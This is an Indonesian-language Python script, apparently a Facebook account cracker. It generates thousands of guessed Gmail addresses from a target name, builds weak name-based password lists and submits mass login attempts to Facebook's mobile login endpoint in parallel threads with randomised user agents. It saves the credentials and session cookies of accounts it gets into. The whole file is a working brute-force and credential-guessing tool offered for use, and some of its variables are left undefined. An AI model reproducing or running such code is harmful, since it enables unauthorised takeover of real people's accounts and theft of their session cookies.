P, M, K, B, H, J, A, O = '\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[38;5;208m','\x1b[1;90m','\x1b[0;33m'

import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64
from concurrent.futures import ThreadPoolExecutor as Ngangkang
from datetime import datetime
from bs4 import BeautifulSoup

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)

id,idz,loop,ok,cp=[],[],0,0,0
ugen=[]
ugen2=[]
bln = ["januari","februari","maret","april","mei","juni","juli","agustus","september","oktober","november","desember"]
now = datetime.now()
tanggal = now.day
blx = now.month

try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()

bulan = bln[xx]
tahun = now.year
simpan = str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010/2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011/2012'
		elif fx[:6] in ['100004']          :tahunz = '2012/2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013/2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014/2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015/2016'
		elif fx[:5] in ['10002']           :tahunz = '2016/2017'
		elif fx[:5] in ['10003']           :tahunz = '2018/2019'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021/2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008/2009'
	elif len(fx)==8:
		tahunz = '2007/2008'
	elif len(fx)==7:
		tahunz = '2006/2007'
	else:tahunz='2023/2024'
	return tahunz
	
def LangsungNgentot():
	print("\n");idz=[]
	for x in id:
		idz.append(x)
		wkt = datetime.now()
	with Ngangkang(max_workers=30) as Kanjut:
		for Ahh_Crott in idz:
			ids,namalu = Ahh_Crott.split('|')[0],Ahh_Crott.split('|')[1].lower()
			nama = namalu.split(' ')[0]
			pwd = ['kata sandi']
			if len(namalu)<6:
				if len(nama)<3:
					pass
				else:
					pwd.append(nama+'123')
			else:
				if len(nama)<3:
					pwd.append(namalu)
				else:
					pwd.append(nama);pwd.append(nama+'01');pwd.append(nama+'02');pwd.append(nama+'03');pwd.append(nama+'09');pwd.append(nama+'12');pwd.append(nama+'21');pwd.append(nama+'22');pwd.append(nama+'23');pwd.append(nama+'24');pwd.append(nama+'25');pwd.append(nama+'90');pwd.append(nama+'99');pwd.append(nama+'321');pwd.append(nama+'123');pwd.append(nama+'1234');pwd.append(nama+'12345');pwd.append(nama+'123456')
			Kanjut.submit(crack,ids,pwd,wkt)
	print()
	exit(f'[±] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
	
def UserAgent():
	rr = random.randint; rc = random.choice
	a = rc(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
	b = rc(['A','C','X','S','T','+',' Pro',' Ultra',' Prime',' Lite',' Plus'])
	build = rc(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
	c = rc(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','RD1B'])
	d = rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
	e = rc(['XiaoMi/Mint Browser/','XiaoMi/MiuiBrowser/'])
	f = rc(['-g','-gn','-go',' gzip(gfe)',' swan-mibrowser'])
	aa = f'Mozilla/5.0 (Linux; U; Android {str(rr(4,15))}; {a}; Redmi Note {str(rr(2,12))}{b} Build/{c}.{str(rr(111111,199999))}.{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(65,125))}.0.{str(rr(2000,7500))}.{str(rr(45,300))} Mobile Safari/537.36 {e}{str(rr(10,60))}.{str(rr(15,35))}.{str(rr(11,32))}.{str(rr(1,9))}{f}'
	bb = f'Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-A{str(rr(6,13))}F Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{str(rr(6,22))}.{str(rr(1,5))} Chrome/{str(rr(65,125))}.0.{str(rr(2000,7500))}.{str(rr(45,300))} Mobile Safari/537.36'
	return random.choice([aa, bb])

def crack(ids,pwd,wkt):
	global loop,ok,cp
	waktu = str(datetime.now()-wkt).split('.')[0]
	print(f"{P}  [{O}{waktu}{P}]—[{loop}{A}│{P}{len(id)}]—[{H}{ok}{A}│{K}{cp}{P}]", end="\r")
	ua = UserAgent()
	ewe = requests.Session()
	for pw in pwd:
		try:
			HEAD1 = {
	"Host": "iphone.facebook.com",
	"viewport-width": "980",
	"sec-ch-ua": "'Not?A_Brand';v='8', 'Chromium';v='108', 'Google Chrome';v='108'",
	"sec-ch-ua-mobile": "?1",
	"sec-ch-ua-platform": "Android",
	"sec-ch-prefers-color-scheme": "light",
	"save-data": "on",
	"upgrade-insecure-requests": "1",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": "https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
	"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
}
			link = ewe.get("https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",headers=HEAD1,allow_redirects=True)
			DATA = {
	"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
	"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
	"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
	"try_number": re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
	"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(link.text)).group(1),
	"email": ids,
	"pass": pw,
	"prefill_contact_point": ids,
	"prefill_source": "browser_onload",
	"prefill_type": "contact_point",
	"first_prefill_source": "browser_dropdown",
	"first_prefill_type": "contact_point",
	"had_cp_prefilled": "false",
	"is_smart_lock": "false",
	"bi_xrwh": "0",
	"_fb_noscript": "true",
}
			HEAD2 = {
	"Host": "iphone.facebook.com",
	"content-length": "413",
	"cache-control": "max-age=0",
	"viewport-width": "980",
	"sec-ch-ua": "'Not?A_Brand';v='8', 'Chromium';v='108', 'Google Chrome';v='108'",
	"sec-ch-ua-mobile": "?1",
	"sec-ch-ua-platform": "Android",
	"sec-ch-prefers-color-scheme": "light",
	"save-data": "on",
	"upgrade-insecure-requests": "1",
	"origin": "https://iphone.facebook.com",
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": "https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
	"accept-encoding": "gzip, deflate, br",
	"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
}
			coki = (';').join([ '%s=%s' % (key, value) for key, value in ewe.cookies.get_dict().items()])
			response = ewe.post("https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=DATA,headers=HEAD2,cookies={'cookie':coki},allow_redirects=True)
			if "checkpoint" in ewe.cookies.get_dict():
				try:uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				except:uid = ids
				if uid in memek:
					break
				memek.append(uid)
				print(f"\r{M}[{P}│{M}] {K}{user}{P}│{K}{pw} {P}──≻ {J}{tahun(user)}\n{P} └─ {K}{ua}\n")
				cp+=1
				open('CP/'+cek,'a').write(uid+'|'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				user = re.findall('c_user=(.*);xs', kuki)[0]
				if user in memek or ids in memek:
					break
				memek.append(user)
				print(f"\r{B}[{P}│{B}] {H}{user}{P}│{H}{pw} {P}──≻ {J}{tahun(user)}\n{P} └─ {H}{kuki}\n")
				ok+=1
				open('OK/'+live,'a').write(user+'|'+pw+'|'+kuki+'\n')
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1

def Email():
	entot = ['gaming','kumala','kumalasari','ramadhan','ramadhani','astuti','sari','ningsih','siregar','muhamad','muhammad','permata','utama','utami','ruslan','yani','utomo','hanafi','marzuki','pratama','permatasari','lestari','puspa','latifah','din','gunawan','irawan','syah','herawan','herawati','wati','dermawan','wan','adijaya','jaya','novita','setiawan','setiawati','setyawati','saputra','putra','putri','pitri','teguh','ghozali','afandi','sihab','rizky','agustin','rahma','rahmawati','efendi','wijaya','maharani','pratiwi','sukma','handayani','sasmita','pramita','priyanka','mahendra','kartika','anggraini','tari','simanjuntak','safitri','saputri','saputra']
	global ok , cp
	print()
	nama = input(f'{P}● nama target : ')
	if ',' in str(nama):
		print(f'{P} └─ {M}masukkan 1 nama saja !');time.sleep(2);Email()
	doma = '@gmail.com'
	jumlah = str(random.randint(2000,7000))
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [
		f'{str(random.randint(20,6000))}',
		f'{str(random.choice(entot))}',
		f'{str(random.choice(entot))}{str(random.randint(20,999))}'
		]
		CC = doma
		DD = f'{AA}{str(random.choice(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		sys.stdout.write(f"\r{P}● sedang dump {len(id)} email ")
	LangsungNgentot()
 
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	os.system('clear')
	Email()